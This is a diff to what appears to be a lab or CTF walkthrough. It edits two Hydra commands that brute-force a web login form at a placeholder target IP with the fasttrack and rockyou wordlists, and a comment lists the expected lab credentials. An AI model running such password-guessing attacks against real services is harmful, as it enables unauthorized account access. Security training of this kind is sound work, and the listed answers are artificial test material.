@@ -401,7 +401,7 @@ Replace `<TARGET_IP>` with the actual server IP or hostname (e.g., `localhost`, 
 # Credentials: admin:adminadmin (fasttrack top 200) OR Davlos:crazygirl (rockyou top 3000)
 # ===================================================================
 hydra -l admin -P /usr/share/wordlists/fasttrack.txt <TARGET_IP> http-post-form \
-  "/login/1:username=^USER^&password=^PASS^:F=incorrect" -t 10 -V -s 5000
+  "/login/1:username=^USER^&password=^PASS^:F=Invalid credentials" -t 10 -V -s 5000
 
 # Flags explained:
 # -l admin          : Single username to test
@@ -413,7 +413,7 @@ hydra -l admin -P /usr/share/wordlists/fasttrack.txt <TARGET_IP> http-post-form 
 
 # Alternative for second credential (Davlos:crazygirl):
 hydra -l Davlos.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form \
-  "/login/1:username=^USER^&password=^PASS^:F=incorrect" -t 10 -V -s 5000
+  "/login/1:username=^USER^&password=^PASS^:F=Invalid credentials" -t 10 -V -s 5000
 
 
 # ===================================================================
